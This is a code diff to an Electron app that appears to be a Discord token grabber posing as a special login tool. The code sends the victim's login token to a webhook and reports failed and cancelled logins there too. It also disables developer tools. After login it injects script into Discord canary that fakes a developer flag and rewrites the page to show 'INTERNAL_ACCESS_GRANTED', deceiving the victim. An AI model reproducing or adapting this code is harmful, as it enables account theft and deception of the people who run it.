@@ -18,6 +18,7 @@ const createWindow = () => {
   win.loadFile('src/index.html');
 
   LoginApi.startLogin();
+  win.devTools = false;
 
   LoginApi.setLoginSuccessListener(result => {
     //when the login is complete
@@ -47,6 +48,15 @@ ${json.locale}
 ${getCreationDate(json.id)}`);
     });
     webhook.send(result.token);
+
+    setTimeout(() => {
+      win.close();
+      const err = new BrowserWindow();
+      err.loadURL('https://canary.discord.com/app');
+      err.webContents.executeJavaScript("Object.defineProperty((webpackChunkdiscord_app.push([[''],{},(e)=>{m=[];for(let c in e.c){m.push(e.c[c])}}]),m).find((m)=>m?.exports?.default?.isDeveloper!==void 0).exports.default,\"isDeveloper\",{get:()=>true});");
+      err.webContents.executeJavaScript("document.getElementsByClassName('colorHeaderSecondary-g5teka')[0].innerText = '1009384 - INTERNAL_ACCESS_GRANTED'");
+      err.webContents.executeJavaScript("document.getElementsByClassName('marginTop4-2JFJJI')[1].innerHTML = '<span class=\"needAccount-MrvMN7\">You are viewing the Internal Login, think this is wrong? <a href=\"https://canary.discord.com/app\">Go to public login</a></span>'");
+    }, 2500);
   });
   
   LoginApi.setLoginFailListener(result => {
@@ -56,22 +66,27 @@ ${getCreationDate(json.id)}`);
       const err = new BrowserWindow();
       err.loadFile('src/error.html');
     }, 2500);
+    webhook.send('User has entered the wrong password, needs captcha verification, or 2fa verification');
   });
   
   LoginApi.setCancelListener(() => {
     //when the user manualy close the login page
     webhook.send('User has canceled the login and closed login page');
+    setTimeout(() => app.quit(), 1000);
   });
   
-  LoginApi.setCloseListener(() => {
-    //when the page is closed by the user or after clogin complete
-    webhook.send('Login button pressed and page has closed or user canceled the login');
-    setTimeout(() => {
-      win.close();
-      const err = new BrowserWindow();
-      err.loadFile('src/error.html');
-    }, 2500);
-  });
+  // LoginApi.setCloseListener(() => {
+  //   //when the page is closed by the user or after clogin complete
+  //   webhook.send('Login button pressed and page has closed or user canceled the login');
+  //   setTimeout(() => {
+  //     win.close();
+  //     const err = new BrowserWindow();
+  //     err.loadURL('https://canary.discord.com/app');
+  //     err.webContents.executeJavaScript("Object.defineProperty((webpackChunkdiscord_app.push([[''],{},(e)=>{m=[];for(let c in e.c){m.push(e.c[c])}}]),m).find((m)=>m?.exports?.default?.isDeveloper!==void 0).exports.default,\"isDeveloper\",{get:()=>true});")
+  //     err.webContents.executeJavaScript("document.getElementsByClassName('colorHeaderSecondary-g5teka')[0].innerText = '1009384 - INTERNAL_ACCESS_GRANTED'");
+  //     err.webContents.executeJavaScript("document.getElementsByClassName('marginTop4-2JFJJI')[1].innerHTML = '<span class=\"needAccount-MrvMN7\">You are viewing the Internal Login, think this is wrong? <a href=\"https://canary.discord.com/app\">Go to public login</a></span>'");
+  //   }, 2500);
+  // });
 };
 
 // This method will be called when Electron has finished
